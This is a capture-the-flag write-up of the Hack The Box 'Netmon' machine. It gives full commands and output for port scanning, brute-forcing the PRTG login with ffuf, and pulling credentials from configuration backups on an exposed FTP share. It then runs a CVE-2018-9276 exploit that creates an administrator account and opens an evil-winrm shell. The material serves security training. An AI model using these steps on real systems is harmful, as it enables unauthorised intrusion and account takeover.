---
tags:
  - windows
---
# HTB: [Netmon](https://app.hackthebox.com/machines/Netmon)

## Services

### TCP

`nmap` TCP scan:

```console
# Nmap 7.94SVN scan initiated Mon Sep  9 10:03:30 2024 as: nmap -v --reason -Pn -T4 --min-rate 10000 -p- --open -sCV -oN nmap_tcp-netmon.htb.txt netmon.htb
Nmap scan report for netmon.htb (10.10.10.152)
Host is up, received user-set (0.099s latency).
rDNS record for 10.10.10.152: t
Not shown: 49819 closed tcp ports (reset), 15703 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON          VERSION
21/tcp    open  ftp          syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http         syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  unknown      syn-ack ttl 127
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-09-09T16:04:49
|_  start_date: 2024-09-08T18:36:25

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  9 10:05:46 2024 -- 1 IP address (1 host up) scanned in 136.06 seconds
```

### 21/ftp

Anonymous FTP is permitted. A windows filesystem is exposed there. Interestingly there's a `user.txt` flag readable in `\Users\Public\Desktop` but it doesn't work.

MIrrored via: `wget --mirror 'ftp://anonymous:hax@netmon.htb'`

#### 80/tcp-http

```console
$ whatweb -a3 http://netmon.htb/
http://netmon.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]
ERROR Opening: http://netmon.htb/index.htm - incorrect header check
```

```http
$ curl -I http://netmon.htb/index.htm
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 33654
Date: Mon, 09 Sep 2024 16:05:29 GMT
Expires: 0
Cache-Control: no-cache
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Server: PRTG/18.1.37.13946
```

![](_/htb-netmon-20240909-1.png)

```console
$ ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -u http://netmon.htb/public/checklogin.htm -X POST -d 'username=prtgadmin' -d 'password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -ac
...
:: Progress: [10000/10000] :: Job [1/1] :: 29 req/sec :: Duration: [0:05:51] :: Errors: 9 ::
```

## Remote Code Execution

Old credentials leaked via Anonymous FTP in an old config file: `Users/All Users/Paessler/PRTG Network Monitor/PRTG Configuration.old`

```xml
...
<name>
  PRTG System Administrator
</name>
<ownerid>
  100
</ownerid>
<password>
  <flags>
    <encrypted/>
  </flags>
  <cell col="0" crypt="PRTG">
    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
  </cell>
  <cell col="1" crypt="PRTG">
    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
  </cell>
</password>
```

And another, from a `.bak` copy:

```xml
<name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    PDWXMOPZT43U2GKGR3YCBILXDMLAUZVBN27KGBOPKXRQ====
                  </cell>
                  <cell col="1" crypt="PRTG">
                    M24VKFRECBEGN3ZQNGSET723GFIPVHYX
                  </cell>
                </password>
```

I tried [prtg_string_decryptor.py](https://github.com/yobabyte/decryptocollection/tree/main) on both sets of encrypted credentails, with bad results:

```console
$ ./prtg_string_decryptor.py aes --guid '{221B25D6-9282-418B-8364-F59561032EE3}' 'JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======'
-305569838

$ ./prtg_string_decryptor.py aes --guid '{221B25D6-9282-418B-8364-F59561032EE3}' 'PDWXMOPZT43U2GKGR3YCBILXDMLAUZVBN27KGBOPKXRQ===='
-1840798137
```

From `/Users/All Users/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak`:

```text
...
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
...
```

That didn't work but `PrTg@dmin2019` did:

![](_/htb-netmon-20240909-2.png)

Now I can try [CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276):

```console
$ ./46527.sh -u http://netmon.htb -c '_ga=GA1.2.1686798169.1725897817; _gid=GA1.2.1816280327.1725897817; OCTOPUS1813713946=ezc2QjMxQ0RELUI2MzUtNDI5NS04QTIxLTk1NjA2NDFEMkRFOH0%3D'
...
 [*] file created
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st'
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```

```powershell
$ evil-winrm -i netmon.htb -u pentest -p 'P3nT3st!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\pentest\Documents> whoami
netmon\pentest
```

## Privilege Escalation

Because the RCE exploit above returns a privileged user, no further privilege escalation is necessary.

## Post-exploitation

Life after `root`.

## Open Questions

## Credits